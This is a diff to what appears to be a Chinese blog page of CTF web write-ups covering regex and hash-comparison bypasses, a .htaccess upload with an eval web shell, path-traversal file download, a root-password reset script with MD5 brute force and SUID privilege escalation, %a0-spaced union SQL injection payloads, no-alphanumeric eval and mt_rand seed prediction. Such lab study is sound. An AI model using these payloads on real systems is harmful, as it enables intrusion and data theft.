@@ -474,14 +474,14 @@
  include "./flag.php"; 
  include "./result.php";
  if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){  
- $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']); 
+ $aaa = **preg_replace**('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']); 
  if(preg_match('/pass_the_level_1#/', $aaa)){  
  echo "here is level 2";      
  if (isset($_POST['admin']) and isset($_POST['root_pwd'])) {       if ($_POST['admin'] == $_POST['root_pwd'])       
  echo '<p>The level 2 can not pass!</p>';     
  // START FORM PROCESSING
- else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){         echo "here is level 3,do you kown how to overcome it?";         if (isset($_POST['level_3'])) {   
- $level_3 = json_decode($_POST['level_3']);                     if ($level_3->result == $result) {  
+ else if ****(sha1($_POST['admin']) === sha1($_POST['root_pwd'])){         echo "here is level 3,do you kown how to overcome it?";         if (isset($_POST['level_3'])) {   
+ $level_3 = **json_decode**($_POST['level_3']);                     if ($level_3->result == $result) {  
  echo "success:".$flag;  
  }    
  else {
@@ -499,7 +499,198 @@
  else{   
  echo 'nonono!';   }  
  echo '<hr>'; }
- ?>
+ ?><p>这里要绕过第一层：</p>
+<p>绕过正则匹配，用于任意字符匹配并不包括换行符，而且<code>^ $</code>界定了必须在同一行，否则匹配不到，直接利用<code>%0a</code>，这里用到了换行绕过%0a，如果正则表达式没有使用多行模式(m)，那么就存在被绕过的可能。然后是因为URL中的#是位置标识符，<code>#</code>在参数里面并不会传递，需要被编码成<code>%23</code>。</p>
+<p>第二层绕过数组</p>
+<p>第三层绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;level_3&#x27;])) &#123;</span><br><span class="line">                  $level_3 = json_decode($_POST[&#x27;level_3&#x27;]);</span><br><span class="line">                  </span><br><span class="line">                  if ($level_3-&gt;result == $result) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>要经过js-encode编码一下，弱等于就好了</p>
+<p>直接{“result”:0}</p>
+<p>或者<code>$level_3-&gt;result == $result</code>,利用布尔<code>true</code>绕过</p>
+<p>payload</p>
+<p>GET： aaa=%0apass_the_level_1%23</p>
+<p>POST:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin[]=0&amp;root_pwd[]=1&amp;level_3=&#123;&quot;result&quot;:true&#125;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="GXYCTF-2019-BabyUpload（WEB文件上传-htaccess）"><a href="#GXYCTF-2019-BabyUpload（WEB文件上传-htaccess）" class="headerlink" title="[GXYCTF 2019]BabyUpload（WEB文件上传.htaccess）"></a>[GXYCTF 2019]BabyUpload（WEB文件上传.htaccess）</h5><p>一个学习文件上传不错的题目，过滤了很多可能绕过的方法：</p>
+<p>（1）<code>后缀名不能有ph！</code>对于<strong>文件后缀名</strong>的限制，修改为jpg</p>
+<p>（2）<code>上传类型也太露骨了吧！</code>对<code>Content-Type</code>的限制，修改为<code>image/jpeg</code>即可绕过</p>
+<p>(诶，别蒙我啊，这标志明显还是php啊<code>对上传文件的内容进行了检测，不能含有</code>&lt;?<code>，这里的PHP版本为：</code>PHP/5.6.23),过滤掉php一般写法就好GIF89a&lt;、script language=”php”&gt;eval($_POST[‘mochu7’]);&lt;、/script&gt;</p>
+<p>这样就可以上传图片马了，但是没有文件包含漏洞，怎么解析呢。</p>
+<p>看到报错的内容，服务器是阿帕奇的，<code>nginx</code>也是可以支持<code>.htaccess</code>的，所以这里就可以利用上传一个<code>.htaccess</code>文件将wen文件内容解析为php程序</p>
+<p>传入一个.hatccess文件写入</p>
+<p>&lt;FilesMatch  “wen”&gt;<br>SetHandler  application/x-httpd-php<br>&lt;。/FilesMatch&gt;</p>
+<p>然后传入任意文件后缀为wen，文件类型判断时 内容加上GIF89a跳过即可：GIF89a&lt;。script language=”php”&gt;eval($_POST[c]);&lt;。/script&gt;，写入后直接post执行c=show_source(‘/flag’);就可以，当然：</p>
+<p>@eval($_POST[c]);写马连shell也可以。</p>
+<h5 id="GKCTF-2021-easycms（WEB-弱口令-目录穿越-后台RCE）"><a href="#GKCTF-2021-easycms（WEB-弱口令-目录穿越-后台RCE）" class="headerlink" title="[GKCTF 2021]easycms（WEB 弱口令 目录穿越 后台RCE）"></a>[GKCTF 2021]easycms（WEB 弱口令 目录穿越 后台RCE）</h5><p>是蝉知7.7欸~亲切的感觉</p>
+<p>想到自己在护网的时候因为md在gh之后，所以很多洞都修了，就没挖出来，这里刚好可以复现一下，先找到登录页面admin.php弱口令进去，然后</p>
+<p>7.7有一个命令执行漏洞</p>
+<p>这题有两种方法：</p>
+<p>1.任意文件下载：</p>
+<p>设计——自定义——导出主题——保存</p>
+<p>下载链接</p>
+<p><a target="_blank" rel="noopener" href="http://1.14.71.254:28173/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=">http://1.14.71.254:28173/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=</a></p>
+<p>最后是一串base64编码，解密后是/var/www/html/system/tmp/theme/default/12.zip而且是文件的绝对路径，我们直接包含/flag就可以了，base64加密一下成为L2ZsYWc=<br>payload：</p>
+<p><a target="_blank" rel="noopener" href="http://cfc147be-ed41-45fc-a12f-672318d14a4f.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=">http://cfc147be-ed41-45fc-a12f-672318d14a4f.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=</a><br>这样就可以把包含flag的下载下来了</p>
+<p>2.文件上传漏洞</p>
+<p>设计——组件——素材库——上传素材，先上传一个txt文件然后编辑它的名称，改成…/…/…/…/…/system/tmp/cksj，然后回去自定义首页幻灯片里面编辑php代码，返回首页得到flag。</p>
+<h5 id="湖湘杯-2021-final-Penetratable-WEB-PHP-哈希爆破-RCE-提权"><a href="#湖湘杯-2021-final-Penetratable-WEB-PHP-哈希爆破-RCE-提权" class="headerlink" title="[湖湘杯 2021 final]Penetratable(WEB PHP 哈希爆破 RCE 提权)"></a>[湖湘杯 2021 final]Penetratable(WEB PHP 哈希爆破 RCE 提权)</h5><ol>
+<li>找前端js文件获取一些信息系</li>
+<li>注册和登录界面二次sql注入</li>
+<li>跑脚本找md5对应的值</li>
+<li>提权</li>
+</ol>
+<p>界面上只有登录和注册界面所以我们先dirsearch扫一下，没什么</p>
+<p>F12看到一些js文件,：</p>
+<p>reg有一些路由接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">function login()&#123;</span><br><span class="line">    let name=encodeURIComponent(Base64.encode($(&quot;.form-floating&gt;input&quot;).eq(0).val()))</span><br><span class="line">    let pass=hex_md5($(&quot;.form-floating&gt;input&quot;).eq(1).val())</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &#x27;/?c=app&amp;m=login&#x27;,</span><br><span class="line">        type: &#x27;post&#x27;,</span><br><span class="line">        data: &#x27;name=&#x27; + name+&#x27;&amp;pass=&#x27; + pass,</span><br><span class="line">        // async:true,</span><br><span class="line">        dataType: &#x27;text&#x27;,</span><br><span class="line">        success: function(data)&#123;</span><br><span class="line">            let res=$.parseJSON(data);</span><br><span class="line">            if (res[&#x27;login&#x27;])&#123;</span><br><span class="line">                switch (res[&#x27;type&#x27;])&#123;</span><br><span class="line">                    case &#x27;user&#x27;: location.href=&quot;/?c=user&quot;; break;</span><br><span class="line">                    case &#x27;admin&#x27;: location.href=&quot;/?c=admin&quot;; break;</span><br><span class="line">                    case &#x27;root&#x27;: location.href=&quot;/?c=root&quot;; break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else if(res[&#x27;alertFlag&#x27;])&#123;</span><br><span class="line">                alert(res[&#x27;alertData&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function userUpdateInfo()&#123;</span><br><span class="line">    let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))</span><br><span class="line">    let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;</span><br><span class="line">    let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;</span><br><span class="line">    let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &#x27;/?c=user&amp;m=updateUserInfo&#x27;,</span><br><span class="line">        type: &#x27;post&#x27;,</span><br><span class="line">        data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,</span><br><span class="line">        // async:true,</span><br><span class="line">        dataType: &#x27;text&#x27;,</span><br><span class="line">        success: function(data)&#123;</span><br><span class="line">            alertHandle(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function signOut()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &#x27;/?c=app&amp;m=signOut&#x27;,</span><br><span class="line">        type: &#x27;get&#x27;,</span><br><span class="line">        dataType: &#x27;text&#x27;,</span><br><span class="line">        success: function(data)&#123;</span><br><span class="line">            alertHandle(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function alertHandle(data)&#123;</span><br><span class="line">    let res=$.parseJSON(data);</span><br><span class="line">    if(res[&#x27;alertFlag&#x27;])&#123;</span><br><span class="line">        alert(res[&#x27;alertData&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    if(res[&#x27;location&#x27;])&#123;</span><br><span class="line">        location.href=res[&#x27;location&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function changeAdminPage(type)&#123;</span><br><span class="line">    let page=$(&#x27;.page&#x27;).text();</span><br><span class="line">    if (type==&#x27;next&#x27;)&#123;</span><br><span class="line">        location.href=&#x27;?c=admin&amp;m=getUserList&amp;page=&#x27;+(parseInt(page)+1);</span><br><span class="line">    &#125;</span><br><span class="line">    if (type==&#x27;last&#x27;)&#123;</span><br><span class="line">        location.href=&#x27;?c=admin&amp;m=getUserList&amp;page=&#x27;+(parseInt(page)-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function changeRootPage(type)&#123;</span><br><span class="line">    let page=$(&#x27;.page&#x27;).text();</span><br><span class="line">    if (type==&#x27;next&#x27;)&#123;</span><br><span class="line">        location.href=&#x27;?c=root&amp;m=getUserInfo&amp;page=&#x27;+(parseInt(page)+1);</span><br><span class="line">    &#125;</span><br><span class="line">    if (type==&#x27;last&#x27;)&#123;</span><br><span class="line">        location.href=&#x27;?c=root&amp;m=getUserInfo&amp;page=&#x27;+(parseInt(page)-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function updatePass()&#123;</span><br><span class="line">    // let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))</span><br><span class="line">    // let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;</span><br><span class="line">    // let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;</span><br><span class="line">    // let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))</span><br><span class="line">    // $.ajax(&#123;</span><br><span class="line">    //     url: &#x27;/?c=admin&amp;m=updatePass&#x27;,</span><br><span class="line">    //     type: &#x27;post&#x27;,</span><br><span class="line">    //     data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,</span><br><span class="line">    //     // async:true,</span><br><span class="line">    //     dataType: &#x27;text&#x27;,</span><br><span class="line">    //     success: function(data)&#123;</span><br><span class="line">    //         alertHandle(data);</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function adminHome()&#123;</span><br><span class="line">    location.href=&#x27;/?c=root&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getUserInfo()&#123;</span><br><span class="line">    location.href=&#x27;/?c=root&amp;m=getUserInfo&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getLogList()&#123;</span><br><span class="line">    location.href=&#x27;/?c=root&amp;m=getLogList&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function downloadLog(filename)&#123;</span><br><span class="line">    location.href=&#x27;/?c=root&amp;m=downloadRequestLog&amp;filename=&#x27;+filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function register()&#123;</span><br><span class="line">    let name=encodeURIComponent(Base64.encode($(&quot;.form-floating&gt;input&quot;).eq(2).val()))</span><br><span class="line">    let pass=hex_md5($(&quot;.form-floating&gt;input&quot;).eq(3).val())</span><br><span class="line">    let saying=encodeURIComponent(Base64.encode($(&quot;.form-floating&gt;input&quot;).eq(4).val()))</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &#x27;/?c=app&amp;m=register&#x27;,</span><br><span class="line">        type: &#x27;post&#x27;,</span><br><span class="line">        data: &#x27;name=&#x27; + name+&#x27;&amp;pass=&#x27; + pass +&#x27;&amp;saying=&#x27; +saying,</span><br><span class="line">        dataType: &#x27;text&#x27;,</span><br><span class="line">        success: function(data)&#123;</span><br><span class="line">            // console.log(data);</span><br><span class="line">            alertHandle(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到root，admin，user，所以推测有一些利用点：</p>
+<p>（1）其他两个已经存在，所以我们可以注册user用户进去，发现有修改密码的模块，网上有说法可以通过抓包修改admin的密码，但是这一步不知道是不是被注释，用不了。</p>
+<p>![屏幕截图 2022-09-03 135616](/../../做题的截图/屏幕截图 2022-09-03 135616.png)</p>
+<p>（2）同时关于修改密码，我想到之前sql的二次注入：</p>
+<p>注册admin’#等登录，但是这个办法无法修改root密码，所以看到js里面有一段注释代码：利用这个方法改变root，发现不行，没有权限，而且admin界面还没法修改密码。</p>
+<p>回看js代码，发现有段代码注释点发现是个改变密码的页面</p>
+<p>尝试通过admin来修改root的密码</p>
+<pre><code>import requests
+import base64
+from hashlib import md5
+
+url = &#39;http://ip地址/&#39;
+url1 = url + &#39;?c=app&amp;m=login&#39;
+url2 = url + &#39;?c=admin&amp;m=updatePass&#39;
+
+user1 = base64.b64encode(b&#39;admin&#39;).decode()
+user2 = base64.b64encode(b&#39;root&#39;)
+pass1 = md5(b&#39;111&#39;).hexdigest()#需要修改自己的admin密码
+pass2 = md5(b&#39;root&#39;).hexdigest()
+
+sess = requests.Session()
+
+data = &#123;
+    # admin/111
+    &quot;name&quot;: user1,    # admin
+    &quot;pass&quot;: pass1     # 111
+&#125;
+r = sess.post(url1, data=data)
+print(r.text)
+
+data = &#123;
+&quot;name&quot;: user2,       # root
+&quot;newPass&quot;: pass2,    # root
+&quot;oldPass&quot;: pass1,    # 111
+&quot;saying&quot;: user2
+&#125;
+r = sess.post(url2, data=data)
+print(r.text)
+</code></pre>
+<p>返回这个，成功修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;login&quot;:true,&quot;type&quot;:&quot;admin&quot;&#125; &#123;&quot;alertData&quot;:&quot;\u4fee\u6539\u6210\u529f&quot;,&quot;location&quot;:&quot;\/?c=admin&quot;,&quot;alertF</span><br></pre></td></tr></table></figure>
+
+<p>有一个下载页面：</p>
+<p>抓包，尝试读取文件内容,<strong>存在目录穿越的漏洞</strong>phpinfo.php</p>
+<p>这个哈希只有爆破了</p>
+<p>这个字符串只能一个个试，跑得有点久</p>
+<p>from hashlib import md5<br>md=”3fde6bb0541387e4ebdadf7c2ff31123”<br>str=”123456789zxcvbnmasdfghjklqwertyuiop”<br>flag=””<br>for i in str:<br>    for j in str:<br>        for k in str:<br>            for m in str:<br>                for n in str:<br>                    for a in str:<br>                        flag=i+j+k+m+n+a<br>                        if md5(flag.encode()).hexdigest()==md:<br>                            print(flag)<br>                            break得到<code>1q2w3e</code></p>
+<p>直接上蚁剑</p>
+<p>虚拟终端没有权限，只能提取</p>
+<p>linux用SUID<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p>
+<p># 搜索 SUID file 可执行文件 find / -type f -perm /4000 2&gt;/dev/null </p>
+<p>利用 sed 命令查看 flag /bin/sed ‘1p’ /flag![屏幕截图 2022-09-03 135245](/../../做题的截图/屏幕截图 2022-09-03 135245.png)</p>
+<h5 id="NCTF-2018-滴-晨跑打卡（WEB-PHP-SQL注入）"><a href="#NCTF-2018-滴-晨跑打卡（WEB-PHP-SQL注入）" class="headerlink" title="[NCTF 2018]滴!晨跑打卡（WEB PHP SQL注入）"></a>[NCTF 2018]滴!晨跑打卡（WEB PHP SQL注入）</h5><p>先fuzz一下</p>
+<p>绕空格的一些常用方法：%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /<em>!</em>/</p>
+<p>看到空格被注入了，绕过空格的<code>%0a</code>，<code>/**/</code>都被过滤了，但是<code>%a0</code>没有过滤</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span>a0union<span class="operator">%</span>a0select<span class="operator">%</span>a01,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="operator">%</span><span class="number">27</span>#</span><br></pre></td></tr></table></figure>
+
+<p>爆库</p>
+<p>id=1%27%a0union%a0select%a01,(SELECT%a0GROUP_CONCAT(SCHEMA_NAME)%a0FROM%a0information_schema.SCHEMATA),3,4%271</p>
+<p>爆表名</p>
+<p>cgctf</p>
+<p>id=1%27%a0union%a0select%a01,(SELECT%a0GROUP_CONCAT(table_name)%a0FROM%a0information_schema.tables%a0where%a0table_schema=%22cgctf%22),3,4%27</p>
+<p>爆列名</p>
+<p>pcnumber</p>
+<p>id=1%27%a0union%a0select%a01,(SELECT%a0GROUP_CONCAT(column_name)%a0FROM%a0information_schema.columns%a0where%a0table_name=%22pcnumber%22),3,4%27</p>
+<p>爆字段：</p>
+<p>flag</p>
+<p>id=1%27%a0union%a0select%a01,(SELECT%a0GROUP_CONCAT(flag)%a0FROM%a0cgctf.pcnumber),3,4%27</p>
+<h5 id="SWPUCTF-2021-新生赛-hardrce-3（WEB-PHP-无数字字母RCE）"><a href="#SWPUCTF-2021-新生赛-hardrce-3（WEB-PHP-无数字字母RCE）" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3（WEB PHP 无数字字母RCE）"></a>[SWPUCTF 2021 新生赛]hardrce_3（WEB PHP 无数字字母RCE）</h5><p><code>&lt;?php</code> </p>
+<p> <code>header(&quot;Content-Type:text/html;charset=utf-8&quot;); </code></p>
+<p> <code>error_reporting(0); </code></p>
+<p> <code>highlight_file(__FILE__);</code></p>
+<p> <code>if(isset($_GET[&#39;wllm&#39;])) &#123;   $wllm = $_GET[&#39;wllm&#39;];</code> </p>
+<p> <code> $blacklist = [&#39; &#39;,&#39;\^&#39;,&#39;\~&#39;,&#39;\|&#39;]; </code>  </p>
+<p> <code>foreach ($blacklist as $blackitem)   &#123; </code> </p>
+<p> <code>  if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $wllm)) &#123; </code>   </p>
+<p> <code>  die(&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;);</code>   </p>
+<p> <code>  &#125;</code>  </p>
+<p> <code>&#125;</code></p>
+<p> <code>if(preg_match(&#39;/[a-zA-Z0-9]/is&#39;,$wllm)) &#123; </code> </p>
+<p> <code> die(&quot;Ra&#39;sAlGhul说用字母数字是没有灵魂的！&quot;);</code> </p>
+<p> <code> &#125;</code> </p>
+<p> <code>echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;</code> </p>
+<p> <code>eval($wllm);</code></p>
+<p> <code>&#125;</code> </p>
+<p> <code>else &#123; </code></p>
+<p> `  echo “蔡总说：注意审题！！！”; }</p>
+<p> ?&gt; </p>
+<p>蔡总说：注意审题！！！</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">(78条消息) 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_yu22x的博客-CSDN博客_绕过正则表达式</a></p>
+<p>我们传入的eval()会变成命令来执行。传入system(ls /);</p>
+<h5 id="GWCTF-2019-枯燥的抽奖-PHP随机数预测"><a href="#GWCTF-2019-枯燥的抽奖-PHP随机数预测" class="headerlink" title="[GWCTF 2019]枯燥的抽奖 (PHP随机数预测)"></a>[GWCTF 2019]枯燥的抽奖 (PHP随机数预测)</h5><p>扫出来一个源码目录：check.php。</p>
+ <?php
+#这不是抽奖程序的源代码！不许看！
+header("Content-Type: text/html;charset=utf-8");
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
+}
+
+mt_srand($_SESSION['seed']);
+$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+$str='';
+$len1=20;
+for ( $i = 0; $i < $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo "<p id='p1'>".$str_show."</p>";
+
+if(isset($_POST['num'])){
+    if($_POST['num']===$str){x
+        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
+    }
+    else{
+        echo "<p id=flag>没抽中哦，再试试吧</p>";
+    }
+}
+show_source("check.php"); 
+
+**mt_srand()函数**的作用是给随机数发生器播种，播种会初始化随机数生成器。语法为mt_srand(seed)，其seed参数为必须。大多数随机数生成器都需要初始种子。在PHP中，因为自动完成，所以mt_srand()函数的使用是可选的。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。播种后mt_rand函数就能使用Mersenne Twister算法生成随机整数。
+但是用这个函数时会存在一些问题，每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种,(播种是由mt_srand()函数完成的)，当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下随机生成的随机数值是相同的。同时，也解释了我们破解随机种子的可行性。如果每次调用mt_rand()函数都需要生成一个随机种子的话，那根本就没办法破解。
+
+我们只要破解了这个随机种子即可用它得到那个字符串
+
+3.可以通过已经知道的几个字符去反推mt_rand(),在利用**php_mt_seed**反推种子
+
+4.python代码
+
+[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">str2=&#x27;OcRiTWUJrN&#x27;</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for i in range(len(str2)):  </span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+利用php_mt_seed工具推出种子，然后带入php代码：
+<?php
+mt_srand(348806110);
+$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+$str='';
+$len1=20;
+for ( $i = 0; $i < $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+echo "<p id='p1'>".$str."</p>";
+?><p>就出来了</p>
+
                 
             </div>
             <hr/>
